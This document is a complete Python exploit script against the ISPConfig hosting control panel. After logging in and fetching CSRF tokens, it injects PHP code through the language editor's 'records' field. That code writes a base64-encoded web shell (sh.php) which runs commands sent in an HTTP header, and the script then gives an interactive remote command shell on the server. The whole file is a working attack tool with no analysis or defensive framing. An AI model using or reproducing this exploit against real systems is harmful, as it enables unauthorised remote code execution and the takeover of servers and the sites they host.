import base64
import requests
import sys
import re
import random
import string
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def ensure_url_structure(url):
    if not url.startswith(('http://', 'https://')):
        print("[-] URL missing scheme (http:// or https://), adding http:// by default.")
        url = "http://" + url
    if not url.endswith('/'):
        url += '/'
    return url

def login(url, username, password, session):
    login_url = f"{url}login/"
    data = {
        'username': username,
        'password': password,
        's_mod': 'login'
    }

    print(f"[+] Logging in with username '{username}' and password '{password}'")
    resp = session.post(login_url, data=data, verify=False)
    if 'Username or Password wrong' in resp.text:
        sys.exit("[-] Login failed!")
    print("[+] Login successful!")

def get_csrf_tokens(url, session, lang_file):
    print("[+] Fetching CSRF tokens...")
    target_url = f"{url}admin/language_edit.php"
    data = {
        'lang': 'en',
        'module': 'help',
        'lang_file': lang_file
    }
    resp = session.post(target_url, data=data, verify=False)

    csrf_id_match = re.search(r'_csrf_id" value="([^"]+)"', resp.text)
    csrf_key_match = re.search(r'_csrf_key" value="([^"]+)"', resp.text)

    if not csrf_id_match or not csrf_key_match:
        sys.exit("[-] CSRF tokens not found!")

    print(f"[+] CSRF ID: {csrf_id_match.group(1)}")
    print(f"[+] CSRF Key: {csrf_key_match.group(1)}")
    return csrf_id_match.group(1), csrf_key_match.group(1)

def inject_shell(url, session, lang_file, csrf_id, csrf_key):
    print("[+] Injecting shell payload...")

    payload = base64.b64encode(
        b"<?php print('____'); passthru(base64_decode($_SERVER['HTTP_C'])); print('____'); ?>"
    ).decode()

    injection = f"'];file_put_contents('sh.php',base64_decode('{payload}'));die;#"

    data = {
        'lang': 'en',
        'module': 'help',
        'lang_file': lang_file,
        '_csrf_id': csrf_id,
        '_csrf_key': csrf_key,
        'records[\\]': injection
    }

    resp = session.post(f"{url}admin/language_edit.php", data=data, verify=False)

    if resp.status_code == 200:
        print(f"[+] Shell written to: {url}admin/sh.php")
    else:
        print(f"[-] Failed to send payload, HTTP {resp.status_code}")

def launch_shell(url, session):
    print("[+] Launching shell...")
    shell_url = f"{url}admin/sh.php"

    while True:
        try:
            cmd = input("\nispconfig-shell# ")
            if cmd.strip().lower() == "exit":
                break

            headers = {'C': base64.b64encode(cmd.encode()).decode()}
            resp = session.get(shell_url, headers=headers, verify=False)
            output = re.search(r'____(.*)____', resp.text, re.DOTALL)

            if output:
                print(output.group(1).strip())
            else:
                print("[-] Exploit failed or no output.")
        except KeyboardInterrupt:
            break

def random_lang_file():
    return ''.join(random.choices(string.ascii_lowercase, k=8)) + '.lng'

def main():
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <URL> <Username> <Password>")
        sys.exit(1)

    url, user, passwd = sys.argv[1:]
    url = ensure_url_structure(url)

    session = requests.Session()
    login(url, user, passwd, session)

    lang_file = random_lang_file()
    csrf_id, csrf_key = get_csrf_tokens(url, session, lang_file)
    inject_shell(url, session, lang_file, csrf_id, csrf_key)
    launch_shell(url, session)

if __name__ == "__main__":
    main()
